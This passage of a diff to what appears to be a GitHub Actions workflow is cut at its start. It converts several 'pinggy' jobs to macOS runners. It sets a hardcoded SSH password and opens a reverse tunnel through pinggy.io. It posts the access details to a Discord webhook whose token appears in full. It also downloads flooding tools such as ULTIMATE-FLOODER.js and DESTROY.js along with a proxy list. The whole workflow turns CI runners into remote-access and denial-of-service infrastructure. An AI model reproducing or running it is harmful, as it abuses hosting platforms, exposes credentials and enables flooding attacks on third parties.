           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -1065,38 +985,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-18:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -1112,7 +1025,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -1130,38 +1042,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-19:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -1177,7 +1082,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -1195,38 +1099,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-20:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -1242,7 +1139,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -1260,12 +1156,12 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
